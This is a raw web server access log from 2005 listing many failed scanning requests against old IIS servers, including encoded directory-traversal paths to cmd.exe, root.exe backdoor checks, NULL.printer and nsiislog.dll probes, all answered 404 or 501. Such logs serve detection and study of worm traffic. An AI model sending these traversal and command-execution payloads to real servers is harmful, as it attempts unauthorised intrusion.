218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:31 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
66.30.71.74 - - [16/Mar/2005:13:46:56 -0500] "GET /NULL.printer" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
195.70.152.248 - - [15/Mar/2005:22:20:33 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:32 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:32 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
202.118.167.71 - - [16/Jun/2005:00:18:19 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
68.236.170.254 - - [02/Jul/2005:17:28:54 -0400] "GET /NULL.printer" 404 301 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:45 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
63.203.254.140 - - [10/Jun/2005:01:23:50 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:18 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
201.252.246.11 - - [10/Jun/2005:01:24:32 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
81.6.250.202 - - [01/Feb/2005:09:05:33 -0500] "GET /NULL.printer" 404 1061 "-" "-"
81.6.250.202 - - [08/Mar/2005:00:10:23 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
220.228.80.199 - - [11/Jun/2005:23:25:49 -0400] "get /scripts/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir" 501 350 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:21 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
64.237.128.47 - - [21/Sep/2005:07:28:38 -0400] "GET /NULL.printer" 404 301 "-" "-"
62.221.237.83 - - [10/Jun/2005:04:15:02 -0400] "get /scripts/..%35c../winnt/system32/cmd.exe?/c+dir" 501 333 "-" "-"
61.72.66.8 - - [14/Jun/2005:11:32:02 -0400] "get /scripts/..%5c../winnt/system32/cmd.exe?/c+dir" 501 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:09 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
61.88.122.10 - - [17/Feb/2005:15:02:50 -0500] "GET /NULL.printer" 404 1061 "-" "-"
68.236.170.254 - - [21/Jun/2005:21:48:23 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
62.221.237.83 - - [14/Jun/2005:11:33:44 -0400] "get /scripts/..%5c../winnt/system32/cmd.exe?/c+dir" 501 332 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:53 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
202.118.167.71 - - [11/Jun/2005:17:35:30 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
63.203.254.140 - - [13/Jun/2005:01:16:37 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
66.249.193.151 - - [13/Jul/2005:20:51:44 -0400] "GET /NULL.printer" 404 301 "-" "-"
65.96.54.37 - - [15/Mar/2005:18:58:33 -0500] "GET /NULL.printer" 404 1061 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:21 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:46 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:57 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
202.118.167.71 - - [14/Jun/2005:00:24:20 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
66.147.14.93 - - [06/Jul/2005:12:47:52 -0400] "GET /NULL.printer" 404 301 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:21 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
201.252.246.11 - - [10/Jun/2005:01:24:32 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:18 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
202.118.167.71 - - [11/Jun/2005:12:00:08 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
220.228.80.199 - - [11/Jun/2005:23:25:49 -0400] "get /scripts/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir" 501 350 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
65.96.54.37 - - [07/Feb/2005:08:01:04 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:21 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:18 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:09 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
69.234.56.155 - - [07/Feb/2005:00:33:15 -0500] "GET /NULL.printer" 404 1061 "-" "-"

221.124.66.208 - - [09/Oct/2005:00:51:48 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:57 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
12.216.230.125 - - [11/Jun/2005:11:56:27 -0400] "get /scripts/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir" 501 347 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:31 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.205.73.192 - - [10/Jun/2005:11:40:14 -0400] "get /scripts/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir" 501 350 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
66.147.14.93 - - [06/Jul/2005:12:47:52 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
202.118.167.71 - - [16/Jun/2005:05:00:33 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:57 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
202.118.167.71 - - [11/Jun/2005:17:35:30 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
206.49.194.36 - - [18/Feb/2005:01:44:39 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
70.147.9.192 - - [09/Feb/2005:23:37:08 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:50 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
64.213.53.210 - - [09/Jan/2006:11:29:58 -0500] "GET /NULL.printer" 404 301 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:09 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
66.64.221.234 - - [06/Oct/2005:21:57:42 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
67.104.84.66 - - [20/Oct/2005:08:58:36 -0400] "GET /NULL.printer" 404 301 "-" "-"
66.249.194.44 - - [23/Jun/2005:22:11:48 -0400] "GET /NULL.printer" 404 301 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:18 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
66.249.194.44 - - [23/Jun/2005:22:11:48 -0400] "GET /NULL.printer" 404 301 "-" "-"
211.144.162.173 - - [05/Feb/2005:08:16:59 -0500] "" 501 1002 "-" "-"
68.73.139.166 - - [12/Feb/2005:11:50:00 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
206.49.194.36 - - [18/Feb/2005:01:44:39 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
206.49.194.36 - - [18/Feb/2005:01:44:39 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
66.64.221.234 - - [17/Aug/2005:16:45:25 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
67.104.84.66 - - [15/Feb/2005:14:07:40 -0500] "GET /NULL.printer" 404 1061 "-" "-"
202.118.167.71 - - [18/Jun/2005:01:48:02 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
